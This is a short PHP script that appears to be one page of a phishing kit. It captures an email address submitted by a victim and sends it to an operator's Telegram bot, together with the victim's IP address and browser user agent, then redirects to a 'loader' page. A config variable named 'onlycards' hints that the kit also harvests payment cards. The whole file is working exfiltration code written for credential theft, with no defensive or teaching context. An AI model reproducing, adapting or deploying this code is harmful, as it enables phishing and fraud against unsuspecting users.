<?php 
include('../../config.php');
session_start();

if($_SESSION['authorized'] == "1")
{
if(isset($_POST['op']))
{



	if(!empty($_POST['email']))
	{


		$_SESSION['email'] = $_POST['email'];

		if($onlycards == "0")
		{
				$message = "
[📦] LOGIN [📦]

📦 E-Mail : ".$_SESSION['email']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$_SESSION['ip']."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."

			";
			$data = ['text' => $message,'chat_id' => $chat_id];
       			 file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}
		
		$_SESSION['userid'] = uniqid();
		header('Location: ../loader.php?goto=explain');


	}

}


}
else{
	die('YOU ARE NOT AUTHORIZED');
}






?>